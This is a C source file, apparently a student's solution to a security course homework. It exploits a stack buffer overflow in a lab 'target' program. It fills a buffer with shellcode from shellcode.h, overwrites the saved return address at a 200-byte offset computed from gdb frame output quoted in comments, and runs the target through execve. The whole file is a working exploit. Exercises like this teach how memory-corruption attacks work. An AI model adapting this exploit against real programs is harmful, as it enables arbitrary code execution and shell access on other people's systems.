#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

// replace this define environment to have the correct path of your own target code
// note that you must have the target executable generated first (by using 'make' command)
#define TARGET "/home/net/mo818628/homework_1/targets/target"

int main(void)
{
  char *args[3];
  char *env[2];
  char *tmp = NULL;

  // Creating an input buffer that can cause buffer overflow in strcpy function in the target executable
  int buffSize = 1000; char buff[buffSize]; 
  // Intialize buffer elements to 0x01
  int i;   for (i=0; i < buffSize; i++)   buff[i] = 0x01;

  // write your code below to (1). Fill the 27 bytes shellcode into the buff variable, and 
  // (2). Overwrite the return address correctly, in order to achieve stack overflow
  // Your own code starts here:
  
  for (i=0; i<27; i++) {
    buff[i] = shellcode[i];
  }
  
// (gdb) info frame
// Stack level 0, frame at 0x7fffffffec40:
//  rip = 0x5555555547bc in foo (target.c:8); saved rip = 0x555555554912
//  called by frame at 0x7fffffffec60
//  source language c.
//  Arglist at 0x7fffffffec30, args: arg=0x7fffffffeef6 "1\300H\273ѝ\226\221Ќ\227\377H\367\333ST_\231RWT^\260;\017\005", '\001' <repeats 171 times>, "\177\377"...
//  Locals at 0x7fffffffec30, Previous frame's sp is 0x7fffffffec40
//  Saved registers:
//   rbp at 0x7fffffffec30, rip at 0x7fffffffec38
// 
// (gdb) x buf
// 0x7fffffffeb70: 0x00000d68


  // delta is 200 (0x7fffffffec38 - 0x7fffffffeb70)

  //unsigned char buf_address[] = "\x7F\xFF\xFF\xFF\xEB\x70\x00";
  unsigned char buf_address[] = "\x70\xEB\xFF\xFF\xFF\x7F\x00";
  int offset = 200;

  for (i=offset; i<offset+7; i++) {
    buff[i] = buf_address[i-offset];
  }

  // Your code ends here. Don't revise following code
  
  // prepare command line input to execute target code
  args[0] = TARGET; 
  args[1] = buff; // the first input parameter to the target code
  args[2] = NULL;
  env[0] = "FOO=bar"; 
  env[1] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");
   return 0;
}
